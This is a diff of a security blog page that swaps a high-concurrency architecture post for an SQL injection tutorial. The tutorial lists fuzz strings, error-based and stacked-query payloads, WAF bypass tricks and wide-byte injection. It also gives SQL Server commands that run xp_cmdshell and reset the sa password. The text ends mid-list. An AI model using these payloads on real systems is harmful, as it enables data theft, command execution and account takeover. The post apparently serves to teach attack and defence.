@@ -6,27 +6,20 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://austfish.cn">
-  <title>什么是高并发 | Fisher&#39;s 安全日记</title>
+  <title>漏洞攻防系列-SQL注入 | Fisher&#39;s 安全日记</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="高并发（High Concurrency）是互联网分布式系统架构设计中必须考虑的因素之一，它通常是指，通过设计保证系统能够同时并行处理很多请求。">
-<meta name="keywords" content="开发,知识">
+  <meta name="description" content="SQL注入是比较常见的网络攻击方式之一，它不是利用操作系统的BUG来实现攻击，而是针对程序员编写时的疏忽，通过SQL语句，实现无账号登录，甚至篡改数据库。">
+<meta name="keywords" content="漏洞,笔记">
 <meta property="og:type" content="article">
-<meta property="og:title" content="什么是高并发">
-<meta property="og:url" content="http://austfish.cn/2019/12/10/什么是高并发/index.html">
+<meta property="og:title" content="漏洞攻防系列-SQL注入">
+<meta property="og:url" content="http://austfish.cn/2020/06/30/漏洞攻防系列-SQL注入/index.html">
 <meta property="og:site_name" content="Fisher&#39;s 安全日记">
-<meta property="og:description" content="高并发（High Concurrency）是互联网分布式系统架构设计中必须考虑的因素之一，它通常是指，通过设计保证系统能够同时并行处理很多请求。">
+<meta property="og:description" content="SQL注入是比较常见的网络攻击方式之一，它不是利用操作系统的BUG来实现攻击，而是针对程序员编写时的疏忽，通过SQL语句，实现无账号登录，甚至篡改数据库。">
 <meta property="og:locale" content="zh">
-<meta property="og:image" content="http://qiniu.austfish.cn/blog/20191210/RzJizgxOddPs.png?imageslim">
-<meta property="og:image" content="http://qiniu.austfish.cn/blog/20191210/y9IHdqV0Kb6P.png?imageslim">
-<meta property="og:image" content="http://qiniu.austfish.cn/blog/20191210/VBJiERQcQWfa.png?imageslim">
-<meta property="og:image" content="http://qiniu.austfish.cn/blog/20191210/8YbizcRz7u96.png?imageslim">
-<meta property="og:image" content="http://qiniu.austfish.cn/blog/20191210/jhhRCezHybYw.png?imageslim">
-<meta property="og:image" content="http://qiniu.austfish.cn/blog/20191210/4KbAecSSEVzl.png?imageslim">
-<meta property="og:updated_time" content="2019-12-10T03:45:27.034Z">
+<meta property="og:updated_time" content="2020-06-30T02:40:17.298Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="什么是高并发">
-<meta name="twitter:description" content="高并发（High Concurrency）是互联网分布式系统架构设计中必须考虑的因素之一，它通常是指，通过设计保证系统能够同时并行处理很多请求。">
-<meta name="twitter:image" content="http://qiniu.austfish.cn/blog/20191210/RzJizgxOddPs.png?imageslim">
+<meta name="twitter:title" content="漏洞攻防系列-SQL注入">
+<meta name="twitter:description" content="SQL注入是比较常见的网络攻击方式之一，它不是利用操作系统的BUG来实现攻击，而是针对程序员编写时的疏忽，通过SQL语句，实现无账号登录，甚至篡改数据库。">
   
     <link rel="alternative" href="/atom.xml" title="Fisher&#39;s 安全日记" type="application/atom+xml">
   
@@ -170,69 +163,467 @@ var _hmt = _hmt || [];
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-什么是高并发" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-漏洞攻防系列-SQL注入" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      什么是高并发
+      漏洞攻防系列-SQL注入
     </h1>
   
 
         
-        <a href="/2019/12/10/什么是高并发/" class="archive-article-date">
-  	<time datetime="2019-12-10T03:33:24.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-12-10</time>
+        <a href="/2020/06/30/漏洞攻防系列-SQL注入/" class="archive-article-date">
+  	<time datetime="2020-06-30T02:38:05.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-06-30</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>高并发（High Concurrency）是互联网分布式系统架构设计中必须考虑的因素之一，它通常是指，通过设计保证系统能够同时并行处理很多请求。</p>
-<a id="more"></a>
-<h1 id="一、什么是高并发"><a href="#一、什么是高并发" class="headerlink" title="一、什么是高并发"></a>一、什么是高并发</h1><blockquote>
-<p>高并发（High Concurrency）是互联网分布式系统架构设计中必须考虑的因素之一，它通常是指，通过设计保证系统能够同时并行处理很多请求。</p>
-</blockquote>
-<p><strong>高并发相关常用的一些指标有响应时间（Response Time），吞吐量（Throughput），每秒查询率QPS（Query Per Second），并发用户数等。</strong></p>
-<p><strong>响应时间</strong>：系统对请求做出响应的时间。例如系统处理一个HTTP请求需要200ms，这个200ms就是系统的响应时间。<br><strong>吞吐量</strong>：单位时间内处理的请求数量。<br><strong>QPS</strong>：每秒响应请求数。在互联网领域，这个指标和吞吐量区分的没有这么明显。<br><strong>并发用户数</strong>：同时承载正常使用系统功能的用户数量。例如一个即时通讯系统，同时在线量一定程度上代表了系统的并发用户数。&nbsp;</p>
-<h1 id="二、如何提升系统的并发能力"><a href="#二、如何提升系统的并发能力" class="headerlink" title="二、如何提升系统的并发能力"></a>二、如何提升系统的并发能力</h1><p>互联网分布式架构设计，提高系统并发能力的方式，方法论上主要有两种：<strong>垂直扩展（Scale Up）与水平扩展（Scale Out）。</strong></p>
-<h5 id="垂直扩展：提升单机处理能力。垂直扩展的方式又有两种："><a href="#垂直扩展：提升单机处理能力。垂直扩展的方式又有两种：" class="headerlink" title="垂直扩展：提升单机处理能力。垂直扩展的方式又有两种："></a>垂直扩展：提升单机处理能力。垂直扩展的方式又有两种：</h5><p>（1）增强单机硬件性能，例如：增加CPU核数如32核，升级更好的网卡如万兆，升级更好的硬盘如SSD，扩充硬盘容量如2T，扩充系统内存如128G；</p>
-<p>（2）提升单机架构性能，例如：使用Cache来减少IO次数，使用异步来增加单服务吞吐量，使用无锁数据结构来减少响应时间；</p>
-<p>在互联网业务发展非常迅猛的早期，如果预算不是问题，强烈建议使用“增强单机硬件性能”的方式提升系统并发能力，因为这个阶段，公司的战略往往是发展业务抢时间，而“增强单机硬件性能”往往是最快的方法。</p>
-<p>不管是提升单机硬件性能，还是提升单机架构性能，都有一个致命的不足：单机性能总是有极限的。所以互联网分布式架构设计高并发终极解决方案还是水平扩展。</p>
-<p>水平扩展：只要增加服务器数量，就能线性扩充系统性能。水平扩展对系统架构设计是有要求的，如何在架构各层进行可水平扩展的设计，以及互联网公司架构各层常见的水平扩展实践，是本文重点讨论的内容。</p>
-<h1 id="三、常见的互联网分层架构"><a href="#三、常见的互联网分层架构" class="headerlink" title="三、常见的互联网分层架构"></a>三、常见的互联网分层架构</h1><p><img src="http://qiniu.austfish.cn/blog/20191210/RzJizgxOddPs.png?imageslim" alt="mark"></p>
-<h5 id="常见互联网分布式架构如上，分为："><a href="#常见互联网分布式架构如上，分为：" class="headerlink" title="常见互联网分布式架构如上，分为："></a>常见互联网分布式架构如上，分为：</h5><p>（1）客户端层：典型调用方是浏览器browser或者手机应用APP<br>（2）反向代理层：系统入口，反向代理<br>（3）站点应用层：实现核心应用逻辑，返回html或者json<br>（4）服务层：如果实现了服务化，就有这一层<br>（5）数据-缓存层：缓存加速访问存储<br>（6）数据-数据库层：数据库固化数据存储</p>
-<p>整个系统各层次的水平扩展，又分别是如何实施的呢？</p>
-<h1 id="四、分层水平扩展架构实践"><a href="#四、分层水平扩展架构实践" class="headerlink" title="四、分层水平扩展架构实践"></a>四、分层水平扩展架构实践</h1><p>反向代理层的水平扩展<br><img src="http://qiniu.austfish.cn/blog/20191210/y9IHdqV0Kb6P.png?imageslim" alt="mark"></p>
-<p>反向代理层的水平扩展，是通过“DNS轮询”实现的：dns-server对于一个域名配置了多个解析ip，每次DNS解析请求来访问dns-server，会轮询返回这些ip。<br>当nginx成为瓶颈的时候，只要增加服务器数量，新增nginx服务的部署，增加一个外网ip，就能扩展反向代理层的性能，做到理论上的无限高并发。</p>
-<h5 id="站点层的水平扩展"><a href="#站点层的水平扩展" class="headerlink" title="站点层的水平扩展"></a>站点层的水平扩展</h5><p><img src="http://qiniu.austfish.cn/blog/20191210/VBJiERQcQWfa.png?imageslim" alt="mark"></p>
-<p>站点层的水平扩展，是通过“nginx”实现的。通过修改nginx.conf，可以设置多个web后端。</p>
-<p>当web后端成为瓶颈的时候，只要增加服务器数量，新增web服务的部署，在nginx配置中配置上新的web后端，就能扩展站点层的性能，做到理论上的无限高并发。</p>
-<h5 id="服务层的水平扩展"><a href="#服务层的水平扩展" class="headerlink" title="服务层的水平扩展"></a>服务层的水平扩展</h5><p><img src="http://qiniu.austfish.cn/blog/20191210/8YbizcRz7u96.png?imageslim" alt="mark"></p>
-<p>服务层的水平扩展，是通过“服务连接池”实现的。</p>
-<p>站点层通过RPC-client调用下游的服务层RPC-server时，RPC-client中的连接池会建立与下游服务多个连接，当服务成为瓶颈的时候，只要增加服务器数量，新增服务部署，在RPC-client处建立新的下游服务连接，就能扩展服务层性能，做到理论上的无限高并发。如果需要优雅的进行服务层自动扩容，这里可能需要配置中心里服务自动发现功能的支持。</p>
-<h5 id="数据层的水平扩展"><a href="#数据层的水平扩展" class="headerlink" title="数据层的水平扩展"></a>数据层的水平扩展</h5><p>在数据量很大的情况下，数据层（缓存，数据库）涉及数据的水平扩展，将原本存储在一台服务器上的数据（缓存，数据库）水平拆分到不同服务器上去，以达到扩充系统性能的目的。</p>
-<p>互联网数据层常见的水平拆分方式有这么几种，以数据库为例：</p>
-<h5 id="按照范围水平拆分"><a href="#按照范围水平拆分" class="headerlink" title="按照范围水平拆分"></a>按照范围水平拆分</h5><p><img src="http://qiniu.austfish.cn/blog/20191210/jhhRCezHybYw.png?imageslim" alt="mark"></p>
-<h5 id="每一个数据服务，存储一定范围的数据，上图为例："><a href="#每一个数据服务，存储一定范围的数据，上图为例：" class="headerlink" title="每一个数据服务，存储一定范围的数据，上图为例："></a>每一个数据服务，存储一定范围的数据，上图为例：</h5><p>user0库，存储uid范围1-1kw<br>user1库，存储uid范围1kw-2kw</p>
-<h5 id="这个方案的好处是："><a href="#这个方案的好处是：" class="headerlink" title="这个方案的好处是："></a>这个方案的好处是：</h5><p>（1）规则简单，service只需判断一下uid范围就能路由到对应的存储服务；<br>（2）数据均衡性较好；<br>（3）比较容易扩展，可以随时加一个uid[2kw,3kw]的数据服务；</p>
-<h5 id="不足是："><a href="#不足是：" class="headerlink" title="不足是："></a>不足是：</h5><p>（1）请求的负载不一定均衡，一般来说，新注册的用户会比老用户更活跃，大range的服务请求压力会更大；</p>
-<h5 id="按照哈希水平拆分"><a href="#按照哈希水平拆分" class="headerlink" title="按照哈希水平拆分"></a>按照哈希水平拆分</h5><p><img src="http://qiniu.austfish.cn/blog/20191210/4KbAecSSEVzl.png?imageslim" alt="mark"><br>每一个数据库，存储某个key值hash后的部分数据，上图为例：<br>user0库，存储偶数uid数据<br>user1库，存储奇数uid数据</p>
-<h5 id="这个方案的好处是：-1"><a href="#这个方案的好处是：-1" class="headerlink" title="这个方案的好处是："></a>这个方案的好处是：</h5><p>（1）规则简单，service只需对uid进行hash能路由到对应的存储服务；<br>（2）数据均衡性较好；<br>（3）请求均匀性较好；</p>
-<h5 id="不足是：-1"><a href="#不足是：-1" class="headerlink" title="不足是："></a>不足是：</h5><p>（1）不容易扩展，扩展一个数据服务，hash方法改变时候，可能需要进行数据迁移；</p>
+        <p>SQL注入是比较常见的网络攻击方式之一，它不是利用操作系统的BUG来实现攻击，而是针对程序员编写时的疏忽，通过SQL语句，实现无账号登录，甚至篡改数据库。<br><a id="more"></a></p>
+<h4 id="0×00-前言"><a href="#0×00-前言" class="headerlink" title="0×00 前言"></a>0×00 前言</h4><p><strong>什么是SQL注入</strong></p>
+<p>SQL注入是一种代码注入技术，用于攻击数据驱动的应用程序。 在应用程序中，如果没有做恰当的过滤，则可能使得恶意的SQL语句被插入输入字段中执行（例如将数据库内容转储给攻击者）。</p>
+<h4 id="0×01-类型"><a href="#0×01-类型" class="headerlink" title="0×01 类型"></a>0×01 类型</h4><h5 id="1-1-按技巧分类"><a href="#1-1-按技巧分类" class="headerlink" title="1.1 按技巧分类"></a>1.1 按技巧分类</h5><p><strong>根据使用的技巧，SQL注入类型可分为</strong></p>
+<ul>
+<li>盲注<ul>
+<li>布尔盲注：只能从应用返回中推断语句执行后的布尔值</li>
+<li>时间盲注：应用没有明确的回显，只能使用特定的时间函数来判断</li>
+</ul>
+</li>
+<li>报错注入：应用会显示全部或者部分的报错信息</li>
+<li>堆叠注入：有的应用可以加入 ; 后一次执行多条语句</li>
+<li>其他</li>
+</ul>
+<h5 id="1-2-按数据获取方式分类"><a href="#1-2-按数据获取方式分类" class="headerlink" title="1.2 按数据获取方式分类"></a>1.2 按数据获取方式分类</h5><p><strong>根据获取数据的方式分为3类</strong></p>
+<ul>
+<li>inband<ul>
+<li>利用Web应用来直接获取数据</li>
+<li>如报错注入</li>
+<li>都是通过站点的响应或者错误反馈来提取数据</li>
+</ul>
+</li>
+<li>inference<ul>
+<li>通过Web的一些反映来推断数据</li>
+<li>如布尔盲注和堆叠注入</li>
+<li>也就是我们通俗的盲注，</li>
+<li>通过web应用的其他改变来推断数据</li>
+</ul>
+</li>
+<li>out of band(OOB)<ul>
+<li>通过其他传输方式来获得数据，比如DNS解析协议和电子邮件</li>
+</ul>
+</li>
+</ul>
+<h4 id="0×02-注入检测"><a href="#0×02-注入检测" class="headerlink" title="0×02 注入检测"></a>0×02 注入检测</h4><h5 id="2-1-常见的注入点"><a href="#2-1-常见的注入点" class="headerlink" title="2.1 常见的注入点"></a>2.1 常见的注入点</h5><ul>
+<li>GET/POST/PUT/DELETE参数</li>
+<li>X-Forwarded-For</li>
+<li>文件名</li>
+</ul>
+<h5 id="2-2-Fuzz注入点"><a href="#2-2-Fuzz注入点" class="headerlink" title="2.2 Fuzz注入点"></a>2.2 Fuzz注入点</h5><ul>
+<li>‘ / “</li>
+<li>1/1</li>
+<li>1/0</li>
+<li>and 1=1</li>
+<li>“ and “1”=”1</li>
+<li>and 1=2</li>
+<li>or 1=1</li>
+<li>or 1=</li>
+<li>‘ and ‘1’=’1</li>
+<li><ul>
+<li><ul>
+<li>^ * % /</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>&lt;&lt; &gt;&gt; || | &amp; &amp;&amp;</li>
+<li>~</li>
+<li>!</li>
+<li>@</li>
+<li>反引号执行</li>
+</ul>
+<h5 id="2-3-测试用常量"><a href="#2-3-测试用常量" class="headerlink" title="2.3 测试用常量"></a>2.3 测试用常量</h5><ul>
+<li>@@version</li>
+<li>@@servername</li>
+<li>@@language</li>
+<li>@@spid</li>
+</ul>
+<h5 id="2-4-测试列数"><a href="#2-4-测试列数" class="headerlink" title="2.4 测试列数"></a>2.4 测试列数</h5><p>例如 <a href="http://www.foo.com/index.asp?id=12+union+select+null,null--" target="_blank" rel="noopener">http://www.foo.com/index.asp?id=12+union+select+null,null--</a> ，不断增加 null 至不返回</p>
+<h5 id="2-5-报错注入"><a href="#2-5-报错注入" class="headerlink" title="2.5 报错注入"></a>2.5 报错注入</h5><ul>
+<li>select 1/0</li>
+<li>select 1 from (select count(<em>),concat(version(),floor(rand(0)</em>2))x from  information_schema.tables group by x)a</li>
+<li>extractvalue(1, concat(0x5c,(select user())))</li>
+<li>updatexml(0x3a,concat(1,(select user())),1)</li>
+<li>exp((SELECT * from(select user())a))</li>
+<li>ST_LatFromGeoHash((select <em> from(select </em> from(select user())a)b))</li>
+<li>GTID_SUBSET(version(), 1)</li>
+</ul>
+<p><strong>基于geometric的报错注入</strong></p>
+<ul>
+<li>GeometryCollection((select <em> from (select </em> from(select user())a)b))</li>
+<li>polygon((select <em> from(select </em> from(select user())a)b))</li>
+<li>multipoint((select <em> from(select </em> from(select user())a)b))</li>
+<li>multilinestring((select <em> from(select </em> from(select user())a)b))</li>
+<li>LINESTRING((select <em> from(select </em> from(select user())a)b))</li>
+<li>multipolygon((select <em> from(select </em> from(select user())a)b))</li>
+</ul>
 <blockquote>
-<p>这里需要注意的是，通过水平拆分来扩充系统性能，与主从同步读写分离来扩充数据库性能的方式有本质的不同。</p>
+<p>其中需要注意的是，基于exp函数的报错注入在MySQL 5.5.49后的版本已经不再生效，具体可以参考这个 commit 95825f 。</p>
 </blockquote>
-<h5 id="通过水平拆分扩展数据库性能："><a href="#通过水平拆分扩展数据库性能：" class="headerlink" title="通过水平拆分扩展数据库性能："></a>通过水平拆分扩展数据库性能：</h5><p>（1）每个服务器上存储的数据量是总量的1/n，所以单机的性能也会有提升；<br>（2）n个服务器上的数据没有交集，那个服务器上数据的并集是数据的全集；<br>（3）数据水平拆分到了n个服务器上，理论上读性能扩充了n倍，写性能也扩充了n倍（其实远不止n倍，因为单机的数据量变为了原来的1/n）；</p>
-<h5 id="通过主从同步读写分离扩展数据库性能："><a href="#通过主从同步读写分离扩展数据库性能：" class="headerlink" title="通过主从同步读写分离扩展数据库性能："></a>通过主从同步读写分离扩展数据库性能：</h5><p>（1）每个服务器上存储的数据量是和总量相同；（2）n个服务器上的数据都一样，都是全集；<br>（3）理论上读性能扩充了n倍，写仍然是单点，写性能不变；</p>
-<p>缓存层的水平拆分和数据库层的水平拆分类似，也是以范围拆分和哈希拆分的方式居多，就不再展开。</p>
-<h1 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h1><p>高并发（High Concurrency）是互联网分布式系统架构设计中必须考虑的因素之一，它通常是指，通过设计保证系统能够同时并行处理很多请求。</p>
-<p>提高系统并发能力的方式，方法论上主要有两种：垂直扩展（Scale Up）与水平扩展（Scale Out）。前者垂直扩展可以通过提升单机硬件性能，或者提升单机架构性能，来提高并发性，但单机性能总是有极限的，互联网分布式架构设计高并发终极解决方案还是后者：水平扩展。</p>
-<h5 id="互联网分层架构中，各层次水平扩展的实践又有所不同："><a href="#互联网分层架构中，各层次水平扩展的实践又有所不同：" class="headerlink" title="互联网分层架构中，各层次水平扩展的实践又有所不同："></a>互联网分层架构中，各层次水平扩展的实践又有所不同：</h5><p>（1）反向代理层可以通过“DNS轮询”的方式来进行水平扩展；<br>（2）站点层可以通过nginx来进行水平扩展；<br>（3）服务层可以通过服务连接池来进行水平扩展；（4）数据库可以按照数据范围，或者数据哈希的方式来进行水平扩展；</p>
-<p>各层实施水平扩展后，能够通过增加服务器数量的方式来提升系统的性能，做到理论上的性能无限。</p>
+<blockquote>
+<p>而以上列表中基于geometric的报错注入在这个 commit 5caea4 中被修复，在5.5.x较后的版本中同样不再生效。</p>
+</blockquote>
+<h5 id="2-6-堆叠注入"><a href="#2-6-堆叠注入" class="headerlink" title="2.6 堆叠注入"></a>2.6 堆叠注入</h5><ul>
+<li>;select 1</li>
+</ul>
+<h5 id="2-7-注释符"><a href="#2-7-注释符" class="headerlink" title="2.7 注释符"></a>2.7 注释符</h5><ul>
+<li><strong>#</strong></li>
+<li>–+</li>
+<li>/<em>xxx</em>/</li>
+<li>/<em>!xxx</em>/</li>
+<li>/<em>!50000xxx</em>/</li>
+</ul>
+<h5 id="2-8-判断过滤规则"><a href="#2-8-判断过滤规则" class="headerlink" title="2.8 判断过滤规则"></a>2.8 判断过滤规则</h5><ul>
+<li>是否有trunc</li>
+<li>是否过滤某个字符</li>
+<li>是否过滤关键字</li>
+<li>slash和编码</li>
+</ul>
+<h5 id="2-9-获取信息"><a href="#2-9-获取信息" class="headerlink" title="2.9 获取信息"></a>2.9 获取信息</h5><ul>
+<li><strong>判断数据库类型</strong><pre><code>* and exists (select * from msysobjects ) &gt; 0 access数据库
+* and exists (select * from sysobjects ) &gt; 0 SQLServer数据库
+</code></pre></li>
+<li><strong>判断数据库表</strong><ul>
+<li>and exsits (select * from admin)</li>
+</ul>
+</li>
+<li>版本、主机名、用户名、库名</li>
+<li><strong>表和字段</strong><ul>
+<li>确定字段数<ul>
+<li>Order By</li>
+<li>Select Into</li>
+</ul>
+</li>
+<li>表名、列名</li>
+</ul>
+</li>
+</ul>
+<h5 id="2-10-测试权限"><a href="#2-10-测试权限" class="headerlink" title="2.10 测试权限"></a>2.10 测试权限</h5><ul>
+<li>文件操作<ul>
+<li>读敏感文件</li>
+<li>写shell</li>
+</ul>
+</li>
+<li>带外通道<ul>
+<li>网络请求</li>
+</ul>
+</li>
+</ul>
+<h4 id="0×03-权限提升"><a href="#0×03-权限提升" class="headerlink" title="0×03 权限提升"></a>0×03 权限提升</h4><h5 id="3-1-UDF提权"><a href="#3-1-UDF提权" class="headerlink" title="3.1 UDF提权"></a>3.1 UDF提权</h5><p>UDF（User Defined Function，用户自定义函数）是MySQL提供的一个功能，可以通过编写DLL扩展为MySQL添加新函数，扩充其功能。当获得MySQL权限之后，即可通过这种方式上传自定义的扩展文件，从MySQL中执行系统命令。</p>
+<h4 id="0×04-数据库检测"><a href="#0×04-数据库检测" class="headerlink" title="0×04 数据库检测"></a>0×04 数据库检测</h4><h5 id="4-1-MySQL"><a href="#4-1-MySQL" class="headerlink" title="4.1 MySQL"></a>4.1 MySQL</h5><ul>
+<li>sleep <code>sleep(1)</code></li>
+<li>benchmark <code>BENCHMARK(5000000, MD5(&#39;test&#39;))</code></li>
+<li>字符串连接<ul>
+<li><code>SELECT &#39;a&#39; &#39;b&#39;</code></li>
+<li><code>SELECT CONCAT(&#39;some&#39;,&#39;string&#39;)</code></li>
+</ul>
+</li>
+<li>version<ul>
+<li><code>SELECT @@version</code></li>
+<li><code>SELECT version()</code></li>
+</ul>
+</li>
+<li>识别用函数<ul>
+<li><code>connection_id()</code></li>
+<li><code>last_insert_id()</code></li>
+<li><code>row_count()</code></li>
+</ul>
+</li>
+</ul>
+<h5 id="4-2-Oracle"><a href="#4-2-Oracle" class="headerlink" title="4.2 Oracle"></a>4.2 Oracle</h5><ul>
+<li><strong>字符串连接</strong><ul>
+<li><code>&#39;a&#39;||&#39;oracle&#39; --</code></li>
+<li><code>SELECT CONCAT(&#39;some&#39;,&#39;string&#39;)</code></li>
+</ul>
+</li>
+<li><strong>version</strong><ul>
+<li><code>SELECT banner FROM v$version</code></li>
+<li><code>SELECT banner FROM v$version WHERE rownum=1</code></li>
+</ul>
+</li>
+</ul>
+<h5 id="4-3-SQLServer"><a href="#4-3-SQLServer" class="headerlink" title="4.3 SQLServer"></a>4.3 SQLServer</h5><ul>
+<li>WAITFOR <code>WAITFOR DELAY &#39;00:00:10&#39;;</code></li>
+<li>SERVERNAME <code>SELECT @@SERVERNAME</code></li>
+<li>version <code>SELECT @@version</code></li>
+<li><strong>字符串连接</strong><ul>
+<li><code>SELECT &#39;some&#39;+&#39;string&#39;</code></li>
+</ul>
+</li>
+<li><strong>常量</strong><ul>
+<li><code>@@pack_received</code></li>
+<li><code>@@rowcount</code></li>
+</ul>
+</li>
+</ul>
+<h5 id="4-4-PostgreSQL"><a href="#4-4-PostgreSQL" class="headerlink" title="4.4 PostgreSQL"></a>4.4 PostgreSQL</h5><ul>
+<li>sleep <code>pg_sleep(1)</code></li>
+</ul>
+<h4 id="0×05-绕过技巧"><a href="#0×05-绕过技巧" class="headerlink" title="0×05 绕过技巧"></a>0×05 绕过技巧</h4><h5 id="5-1-编码绕过"><a href="#5-1-编码绕过" class="headerlink" title="5.1 编码绕过"></a>5.1 编码绕过</h5><ul>
+<li>大小写</li>
+<li>url编码</li>
+<li>html编码</li>
+<li>十六进制编码</li>
+<li>unicode编码</li>
+</ul>
+<h5 id="5-2-注释"><a href="#5-2-注释" class="headerlink" title="5.2 注释"></a>5.2 注释</h5><ul>
+<li><code>//</code>  <code>--</code>  <code>--</code>  <code>+</code>  <code>--</code>  <code>-</code>  <code>#</code>  <code>/**/</code>  <code>;%00</code></li>
+<li>内联注释用的更多，它有一个特性<code>/!**/</code> 只有MySQL能识别</li>
+<li>e.g. <code>index.php?id=-1 /*!UNION*/ /*!SELECT*/ 1,2,3</code></li>
+</ul>
+<h5 id="5-3-只过滤了一次时"><a href="#5-3-只过滤了一次时" class="headerlink" title="5.3 只过滤了一次时"></a>5.3 只过滤了一次时</h5><ul>
+<li><code>union</code> =&gt; <code>ununionion</code></li>
+</ul>
+<h5 id="5-4-相同功能替换"><a href="#5-4-相同功能替换" class="headerlink" title="5.4 相同功能替换"></a>5.4 相同功能替换</h5><ul>
+<li>函数替换<ul>
+<li><code>substring</code> / <code>mid</code> / <code>sub</code></li>
+<li><code>ascii</code> / <code>hex</code> / <code>bin</code></li>
+<li><code>benchmark</code> / <code>sleep</code></li>
+</ul>
+</li>
+<li>变量替换<ul>
+<li><code>user()</code> / <code>@@user</code></li>
+</ul>
+</li>
+<li>符号和关键字<ul>
+<li><code>and</code> / <code>&amp;</code></li>
+<li><code>or</code> / <code>|</code></li>
+</ul>
+</li>
+</ul>
+<h5 id="5-5-HTTP参数"><a href="#5-5-HTTP参数" class="headerlink" title="5.5 HTTP参数"></a>5.5 HTTP参数</h5><ul>
+<li>HTTP参数污染<ul>
+<li><code>id=1&amp;id=2&amp;id=3</code> 根据容器不同会有不同的结果</li>
+</ul>
+</li>
+<li>HTTP分割注入</li>
+</ul>
+<h5 id="5-6-缓冲区溢出"><a href="#5-6-缓冲区溢出" class="headerlink" title="5.6 缓冲区溢出"></a>5.6 缓冲区溢出</h5><ul>
+<li>一些C语言的WAF处理的字符串长度有限，超出某个长度后的payload可能不会被处理</li>
+</ul>
+<h5 id="5-7-二次注入"><a href="#5-7-二次注入" class="headerlink" title="5.7 二次注入"></a>5.7 二次注入</h5><ul>
+<li>二次注入有长度限制时，通过多句执行的方法改掉数据库该字段的长度绕过</li>
+</ul>
+<h4 id="0×06-SQL注入小技巧"><a href="#0×06-SQL注入小技巧" class="headerlink" title="0×06 SQL注入小技巧"></a>0×06 SQL注入小技巧</h4><h5 id="6-1-宽字节注入"><a href="#6-1-宽字节注入" class="headerlink" title="6.1 宽字节注入"></a>6.1 宽字节注入</h5><p>一般程序员用gbk编码做开发的时候，会用 <code>set names &#39;gbk&#39;</code> 来设定，这句话等同于<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set</span><br><span class="line">character_set_connection = &apos;gbk&apos;,</span><br><span class="line">character_set_result = &apos;gbk&apos;,</span><br><span class="line">character_set_client = &apos;gbk&apos;;</span><br></pre></td></tr></table></figure></p>
+<p>漏洞发生的原因是执行了 <code>set character_set_client = &#39;gbk&#39;;</code> 之后，mysql就会认为客户端传过来的数据是gbk编码的，从而使用gbk去解码，而mysql_real_escape是在解码前执行的。但是直接用 <code>set names &#39;gbk&#39;</code> 的话real_escape是不知道设置的数据的编码的，就会加<code>%5c</code> 。此时server拿到数据解码 就认为提交的字符+%5c是gbk的一个字符，这样就产生漏洞了。</p>
+<p>解决的办法有三种，第一种是把client的charset设置为binary，就不会做一次解码的操作。第二种是是 <code>mysql_set_charset(&#39;gbk&#39;)</code> ，这里就会把编码的信息保存在和数据库的连接里面，就不会出现这个问题了。 第三种就是用pdo。</p>
+<p>还有一些其他的编码技巧，比如latin会弃掉无效的unicode，那么admin%32在代码里面不等于admin，在数据库比较会等于admin。</p>
+<h4 id="0×07-CheatSheet"><a href="#0×07-CheatSheet" class="headerlink" title="0×07 CheatSheet"></a>0×07 CheatSheet</h4><h5 id="7-1-SQL-Server-Payload"><a href="#7-1-SQL-Server-Payload" class="headerlink" title="7.1 SQL Server Payload"></a>7.1 SQL Server Payload</h5><ul>
+<li><strong>Version</strong><ul>
+<li><code>SELECT @@version</code></li>
+</ul>
+</li>
+<li><strong>Comment</strong><ul>
+<li><code>SELECT 1 -- comment</code></li>
+<li><code>SELECT /*comment*/1</code></li>
+</ul>
+</li>
+<li><strong>Space</strong><ul>
+<li><code>0x01 - 0x20</code></li>
+</ul>
+</li>
+<li><strong>Current User</strong><ul>
+<li><code>SELECT user_name()</code></li>
+<li><code>SELECT system_user</code></li>
+<li><code>SELECT user</code></li>
+<li><code>SELECT loginame FROM master..sysprocesses WHERE spid = @@SPID</code><br><strong>* List User</strong></li>
+<li><code>SELECT name FROM master..syslogins</code></li>
+</ul>
+</li>
+<li><strong>Current Database</strong><ul>
+<li><code>SELECT DB_NAME()</code></li>
+</ul>
+</li>
+<li><strong>List Database</strong><ul>
+<li><code>SELECT name FROM master..sysdatabases</code></li>
+</ul>
+</li>
+<li><strong>Command</strong><ul>
+<li><code>EXEC xp_cmdshell &#39;net user&#39;</code></li>
+</ul>
+</li>
+<li><strong>Ascii</strong><ul>
+<li><code>SELECT char(0x41)</code></li>
+<li><code>SELECT ascii(&#39;A&#39;)</code></li>
+<li><code>SELECT char(65)+char(66)</code> =&gt; return <code>AB</code></li>
+</ul>
+</li>
+<li><strong>Delay</strong><ul>
+<li><code>WAITFOR DELAY &#39;0:0:3&#39;</code>pause for 3 seconds</li>
+</ul>
+</li>
+<li><strong>Change Password</strong><ul>
+<li><code>ALTER LOGIN [sa] WITH PASSWORD=N&#39;NewPassword&#39;</code></li>
+</ul>
+</li>
+<li><strong>Trick</strong><ul>
+<li><code>id=1 union:select password from:user</code></li>
+</ul>
+</li>
+</ul>
+<h5 id="7-2-MySQL-Payload"><a href="#7-2-MySQL-Payload" class="headerlink" title="7.2 MySQL Payload"></a>7.2 MySQL Payload</h5><ul>
+<li><strong>Version</strong><ul>
+<li><code>SELECT @@version</code></li>
+</ul>
+</li>
+<li><strong>Comment</strong><ul>
+<li><code>SELECT 1 -- comment</code></li>
+<li><code>SELECT 1 # comment</code></li>
+<li><code>SELECT /*comment*/1</code></li>
+</ul>
+</li>
+<li><strong>Space</strong><ul>
